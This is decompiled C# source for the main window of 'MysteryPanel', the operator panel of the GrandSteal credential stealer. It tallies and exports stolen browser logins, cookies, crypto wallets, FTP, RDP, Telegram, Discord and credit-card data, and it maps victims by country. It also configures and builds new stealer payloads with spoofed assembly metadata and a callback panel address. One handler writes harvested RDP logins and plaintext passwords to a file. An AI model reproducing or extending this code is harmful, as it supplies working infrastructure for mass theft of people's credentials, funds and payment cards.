using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reactive;
using System.Reactive.Concurrency;
using System.Threading.Tasks;
using System.Windows.Forms;
using BrightIdeasSoftware;
using GrandSteal.SharedModels.Models;
using LiveCharts.Maps;
using LiveCharts.WinForms;
using LogManager.Core.Data;
using LogManager.Core.DerivedClasses.GrandSteal;
using LogManager.Core.Domain;
using MetroSet_UI;
using MetroSet_UI.Child;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using MetroSet_UI.Enums;
using MetroSet_UI.Forms;
using MysteryPanel.ViewModels;
using ReactiveUI;

namespace MysteryPanel.App.Views
{
	// Token: 0x02000037 RID: 55
	public partial class MainView : MetroSetForm, IViewFor<PanelViewModel>, IViewFor, IActivatable
	{
		// Token: 0x17000086 RID: 134
		// (get) Token: 0x060001C3 RID: 451 RVA: 0x00003636 File Offset: 0x00001836
		// (set) Token: 0x060001C4 RID: 452 RVA: 0x0000363E File Offset: 0x0000183E
		public PanelViewModel ViewModel { get; set; }

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x060001C5 RID: 453 RVA: 0x00003647 File Offset: 0x00001847
		// (set) Token: 0x060001C6 RID: 454 RVA: 0x0000364F File Offset: 0x0000184F
		object IViewFor.ViewModel
		{
			get
			{
				return this.ViewModel;
			}
			set
			{
				this.ViewModel = (value as PanelViewModel);
			}
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x00008BD4 File Offset: 0x00006DD4
		public MainView()
		{
			this.InitializeComponent();
			IntPtr handle = base.Handle;
			IntPtr handle2 = this.logsListView.Handle;
			this.ViewModel = new PanelViewModel(new ControlScheduler(this));
			this.Events().Closing.InvokeCommand(this.ViewModel.CloseApplicationCommand);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ServerLogs, (MainView view) => view.serverLogs.DataSource, null, null, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.ClearCommand, (MainView view) => view.clearBtn, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.ConvertToJsonCommand, (MainView view) => view.netScapeBtn, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.ConvertToNetscapeCommand, (MainView view) => view.jsonBtn, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.OpenLogsFolderCommand, (MainView view) => view.browserDirBtn, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CurrentLogDirectory, (MainView view) => view.pathToLogs.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CurrentDomainFilter, (MainView view) => view.domainFilter.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.Domains, (MainView view) => view.domainsLb.DataSource, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableLogs, (MainView view) => view.pathToLogs.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableLogs, (MainView view) => view.domainFilter.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableLogs, (MainView view) => view.domainsLb.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableLogs, (MainView view) => view.accountFormatter.Enabled, null, null, null);
			this.WhenAnyValue((MainView view) => view.ViewModel.IsLogsLoading).Subscribe(delegate(bool current)
			{
				this.logsLoading.Visible = current;
			});
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.Account.Login, (MainView view) => view.AccountLogin.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CurrentAccountFormatter, (MainView view) => view.accountFormatter.Text, null, null, null);
			this.WhenAnyValue((MainView view) => view.ViewModel.Account.RegistrationDate).Subscribe(delegate(DateTime current)
			{
				this.RegisterDate.Text = current.ToLongDateString() + " " + current.ToLongTimeString();
			});
			this.WhenAnyValue((MainView view) => view.ViewModel.Account.ActivationDate).Subscribe(delegate(DateTime current)
			{
				this.ActivateDate.Text = current.ToLongDateString() + " " + current.ToLongTimeString();
			});
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.Account.ID, (MainView view) => view.accountID.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.PanelVersion, (MainView view) => view.panelVersion.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.Logs.Collection, (MainView view) => view.logsListView.DataSource, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CurrentThemeStyle, (MainView view) => view.mainStyle.Style, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalAccounts, (MainView view) => view.totalAccounts.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalCookies, (MainView view) => view.totalCookies.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalCryptoWallets, (MainView view) => view.totalCrypto.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalFtps, (MainView view) => view.totalFtps.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalWinStoreCreds, (MainView view) => view.totalWinStore.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalTelegram, (MainView view) => view.totalTelegram.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalDiscord, (MainView view) => view.totalDiscord.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalCreditCards, (MainView view) => view.totalCreditCards.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalDesktopFiles, (MainView view) => view.totalDesktopFiles.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.StorageOfCounters.TotalRDP, (MainView view) => view.totalRDP.Text, null, null, null);
			this.styleSwitcher.SwitchedChanged += delegate(object _)
			{
				this.ViewModel.ChangeTheme();
			};
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.CountrisCounters, (MainView view) => view.geoMapStat.HeatMap, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.LogsVM.Top10, (MainView view) => view.top10CountriesLb.DataSource, null, null, null);
			this.WhenAnyValue((MainView view) => view.ViewModel.CurrentThemeStyle).Subscribe(delegate(Style current)
			{
				this.logsListView.ApplyTheme(current);
				this.top10CountriesLb.ApplyTheme(current);
				this.clearBtn.ApplyTheme();
				this.trayButton.ApplyTheme();
				this.netScapeBtn.ApplyTheme();
				this.jsonBtn.ApplyTheme();
				this.addDesktopExtBtn.ApplyTheme();
				this.desktopExtTb.ApplyTheme(current);
				this.desktopExtList.ApplyTheme(current);
				this.pathToLogs.ApplyTheme(current);
				this.domainsLb.ApplyTheme(current);
				this.browserDirBtn.ApplyTheme();
				this.accountFormatter.ApplyTheme(current);
				this.assemblyCompany.ApplyTheme(current);
				this.assemblyCopyright.ApplyTheme(current);
				this.assemblyDescription.ApplyTheme(current);
				this.assemblyIcon.ApplyTheme(current);
				this.assemblyPlatform.ApplyTheme(current);
				this.assemblySourceID.ApplyTheme(current);
				this.assemblyVersion.ApplyTheme(current);
				this.assemblyOpenIconBtn.ApplyTheme();
				this.assemblyIP.ApplyTheme(current);
				this.createBuildBtn.ApplyTheme();
			});
			this.PathsView = new PathsView(this.ViewModel)
			{
				Owner = this
			};
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.DesktopExtensions, (MainView view) => view.desktopExtList.DataSource, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CurrentDesktopExt, (MainView view) => view.desktopExtTb.Text, null, null, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.AddNewExtCommand, (MainView view) => view.addDesktopExtBtn, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabDesktopFiles, (MainView view) => view.desktopExtList.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabDesktopFiles, (MainView view) => view.desktopExtTb.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabDesktopFiles, (MainView view) => view.addDesktopExtBtn.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabDesktopFiles, (MainView view) => view.stealDesktop.Checked, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabBrowserCredentials, (MainView view) => view.stealLogs.Checked, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabColdWallets, (MainView view) => view.stealWallets.Checked, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabFtp, (MainView view) => view.stealFTPs.Checked, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabRdp, (MainView view) => view.stealWinCreds.Checked, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabTelegram, (MainView view) => view.stealTelegram.Checked, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.ClientSettings.GrabDiscord, (MainView view) => view.stealDiscord.Checked, null, null, null);
			this.totalFtps.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("FTP");
			});
			this.totalRDP.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("RDP");
			});
			this.totalCrypto.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("WALLETS");
			});
			this.totalTelegram.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("Telegram");
			});
			this.totalDiscord.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("Discord");
			});
			this.totalDesktopFiles.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("Desktop");
			});
			this.totalCreditCards.Events().DoubleClick.Subscribe(delegate(EventArgs _)
			{
				this.ViewModel.CurrentPathsSource("CC");
			});
			this.WhenAnyValue((MainView view) => view.ViewModel.IsAvaliableChangeSettings).Subscribe(delegate(bool current)
			{
				this.buildCreating.Visible = !current;
			});
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.OutputCompany, (MainView view) => view.assemblyCompany.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.OutputCopyright, (MainView view) => view.assemblyCopyright.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.OutputDescription, (MainView view) => view.assemblyDescription.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CurrentIconPath, (MainView view) => view.assemblyIcon.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.OutputPlatform, (MainView view) => view.assemblyPlatform.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.OutputVersion, (MainView view) => view.assemblyVersion.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.SourceID, (MainView view) => view.assemblySourceID.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.CompilationSettings.PanelAdress, (MainView view) => view.assemblyIP.Text, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyCompany.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyCopyright.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyDescription.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyIP.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyIcon.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyPlatform.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblySourceID.Enabled, null, null, null);
			this.Bind(this.ViewModel, (PanelViewModel vm) => vm.IsAvaliableChangeSettings, (MainView view) => view.assemblyVersion.Enabled, null, null, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.OpenIconCommand, (MainView view) => view.assemblyOpenIconBtn, null);
			this.BindCommand(this.ViewModel, (PanelViewModel vm) => vm.CreateBuildCommand, (MainView view) => view.createBuildBtn, null);
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x0000B4E8 File Offset: 0x000096E8
		private void GeoMapStat_OnRightMouseLandClick(object sender, MapData e)
		{
			MapData mapData = this.geoMapStat.Base.Lands.Values.FirstOrDefault((MapData x) => x.Shape == sender);
			if (mapData == null)
			{
				return;
			}
			double num;
			if (!this.geoMapStat.Base.HeatMap.TryGetValue(mapData.Id, out num))
			{
				return;
			}
			Dictionary<string, string> languagePack = this.geoMapStat.Base.LanguagePack;
			if (languagePack != null)
			{
				string text;
				languagePack.TryGetValue(mapData.Id, out text);
			}
			this.countryContextMenu.Show(Cursor.Position);
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x0000365D File Offset: 0x0000185D
		private void TrayButton_Click(object sender, EventArgs e)
		{
			base.Hide();
			this.appTray.Visible = true;
		}

		// Token: 0x060001CA RID: 458 RVA: 0x00003671 File Offset: 0x00001871
		private void AppTray_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				base.Show();
				this.appTray.Visible = false;
			}
		}

		// Token: 0x060001CB RID: 459 RVA: 0x0000B584 File Offset: 0x00009784
		private void LogsListView_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left && this.logsListView.SelectedIndex != -1)
			{
				string keyID = this.logsListView.Items[this.logsListView.SelectedIndex].SubItems[1].Text;
				RemoteClientInformation remoteClientInformation = this.ViewModel.LogsVM.Logs.Collection.FirstOrDefault((RemoteClientInformation x) => x.Id == Convert.ToInt32(keyID));
				if (remoteClientInformation != null)
				{
					Process.Start(Path.Combine(Directory.GetCurrentDirectory(), "Results", string.Concat(new string[]
					{
						"[",
						remoteClientInformation.HardwareID,
						"] [",
						remoteClientInformation.UserName,
						"]"
					})));
				}
			}
		}

		// Token: 0x060001CC RID: 460 RVA: 0x0000B660 File Offset: 0x00009860
		private void ListOfFoldersToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MapData currentMapData = this.geoMapStat.Base.CurrentMapData;
			double num;
			if (this.geoMapStat.HeatMap.TryGetValue(currentMapData.Id, out num))
			{
				this.ViewModel.CurrentPathsSource("Country|" + currentMapData.Id);
			}
		}

		// Token: 0x060001CD RID: 461 RVA: 0x00003692 File Offset: 0x00001892
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.desktopExtList.SelectedIndex != -1 && this.desktopExtList.Enabled)
			{
				this.ViewModel.RemoveExt(this.desktopExtList.SelectedIndex);
			}
		}

		// Token: 0x060001CE RID: 462 RVA: 0x0000B6B4 File Offset: 0x000098B4
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.domainsLb.SelectedIndex != -1 && this.domainsLb.Enabled && this.ViewModel.Domains.Count > 0 && this.ViewModel.Domains.Count > this.domainsLb.SelectedIndex)
			{
				this.ViewModel.SaveDomainsCommand.Execute(this.ViewModel.Domains[this.domainsLb.SelectedIndex]);
			}
		}

		// Token: 0x060001CF RID: 463 RVA: 0x0000B738 File Offset: 0x00009938
		private async void saveRDPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.totalWinStore.Text != "0")
				{
					PredicateFactory<string, AbstractLogProfile> predicateFactory = PredicateFactory<string, AbstractLogProfile>.Create();
					predicateFactory.Predicates.Add(new GrandStealLogProfile(), delegate(string x)
					{
						string[] array = new DirectoryInfo(x).Name.Split(new string[]
						{
							" "
						}, StringSplitOptions.None);
						return array.Length == 2 && (array[0].Contains("[") && array[0].Contains("]") && array[1].Contains("[")) && array[1].Contains("]");
					});
					ParalleledLogProfile engine = new ParalleledLogProfile(this.ViewModel.LogsVM.PathsToLogs.ClientsWithRDP)
					{
						HandlerMap = predicateFactory
					};
					LogProfileController controller = new LogProfileController(engine);
					IEnumerable<AbstractAccount> enumerable = (await Task.Factory.StartNew<IEnumerable<GrandStealLogProfile>>(() => from x in controller.Load()
					select x as GrandStealLogProfile)).SelectMany((GrandStealLogProfile x) => x.RDPS) ?? new List<AbstractAccount>();
					string text = "RDP_" + DateTime.Now.ToString("O").Replace(':', '_') + ".txt";
					foreach (AbstractAccount abstractAccount in enumerable)
					{
						if (abstractAccount.Password != "NOT SAVED")
						{
							File.AppendAllText(text, string.Concat(new string[]
							{
								abstractAccount.URL,
								" ",
								abstractAccount.Login,
								" ",
								abstractAccount.Password,
								Environment.NewLine
							}));
						}
					}
					if (enumerable.Any<AbstractAccount>())
					{
						if (File.Exists(text))
						{
							Process.Start(text);
						}
						else
						{
							MessageBox.Show("RDPs with saved password not found");
						}
					}
				}
			}
			catch (Exception arg)
			{
				MessageBox.Show("Ошибка: " + arg);
			}
		}

		// Token: 0x040000F9 RID: 249
		public PathsView PathsView;
	}
}
